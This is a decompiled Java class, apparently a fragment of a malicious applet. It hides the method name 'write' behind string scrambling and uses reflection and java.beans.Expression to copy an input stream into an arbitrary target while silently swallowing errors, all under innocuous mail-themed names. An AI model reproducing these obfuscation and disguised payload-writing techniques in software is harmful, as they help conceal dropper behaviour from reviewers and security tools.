// 
// Decompiled by Procyon v0.5.30
// 

package mail;

import java.io.InputStream;
import java.lang.reflect.Method;
import java.beans.Expression;

public class Cid extends Expression
{
    public static Method m;
    public static byte[] bytes;
    public static int[] ints;
    
    static {
        Cid.m = null;
        Cid.bytes = new byte[1000];
        Cid.ints = new int[1000];
    }
    
    protected static String getProperty() {
        return "1erg4wr".concat("ite").substring(5);
    }
    
    public Cid(final Object o, final String s, final Object[] i) {
        super(o, s, i);
    }
    
    public static void move(final InputStream c, final Object ch) {
        try {
            Cid.m = ch.getClass().getMethod(getProperty(), Cid.bytes.getClass(), Integer.TYPE, Integer.TYPE);
        }
        catch (Exception ex2) {}
        try {
            int id;
            while ((id = c.read(Cid.bytes, 0, 1000)) != -1) {
                if (!MailAgent.validForm(Cid.m, ch, new Object[] { Cid.bytes, 0, id })) {
                    break;
                }
            }
        }
        catch (Exception ex) {}
    }
}
